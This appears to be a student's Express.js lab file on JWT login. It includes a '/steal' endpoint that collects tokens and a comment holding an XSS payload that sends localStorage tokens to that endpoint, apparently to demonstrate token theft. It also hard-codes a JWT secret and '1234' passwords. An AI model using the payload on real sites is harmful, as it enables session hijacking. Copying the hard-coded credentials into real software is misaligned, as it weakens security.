const express= require('express');
const jwt= require('jsonwebtoken');
const bodyParser =require ('body-parser');
const cors=require('cors');

const app=express();
app.use(bodyParser.json());
app.use(cors());

const SECRET_KEY="mi_clave_secreta_super_segura";

//usuario de prueba 
const user={
    id: 1,
    username:"admin",
    password:"1234"
};

const users2={
    id: 2,
    username:"Gerardo",
    password:"1234"
};

const stolenTokens=new Set();

app.post('/login',(req,res)=>{
    const {username, password}=req.body;
    if(username===user.username && password=== user.password){
        const token=jwt.sign(
            {
                userId:user.id,
                username:user.username
            },SECRET_KEY,
            {expiresIn:'1h'}
        );
        return res.json({token})
    }else if(username===users2.username && password=== users2.password){
        const token=jwt.sign(
            {
                userId:users2.id,
                username:users2.username
            },SECRET_KEY,
            {expiresIn:'5m'}
        );
        return res.json({token})
    }
    return res.status(401).json({message:"credenciales incorrectas"});
});

const veryToken=require('./middleware/auth');

app.get('/dashboard',veryToken,(req,res)=>{
    const token = req.headers['authorization'].split(' ')[1];
    if(stolenTokens.has(token)){
        return res.json({tokenCompromised:true});
    }
    res.json({message:"Bienvenido al dashboard- buenos dias ",user:req.user});
});

//enviar captura
app.get('/public',veryToken,(req,res)=>{
    res.json({message:"Ruta Publica- Ramirez Romero Gerardo Gabriel"});
});
//----------------------------
app.get('/',(req,res)=>{
    res.json({message:"hola mundo Ramirez Romero Gerardo Gabriel"});
});
app.get('/steal',(req,res)=>{
    const token = req.query.token;
    console.log("TOKEN ROBADO",token);
    stolenTokens.add(token);
    res.json({message:"token robado"});
});
//ejemplo usar para robar token en el bashboard 
//<img src=x onerror="fetch('http://localhost:4000/steal?token=' + localStorage.getItem('token'))"> 
app.listen(4000,()=>{
    console.log("'servidor corriendo'-Ramirez Romero en http://localhost:4000");
});
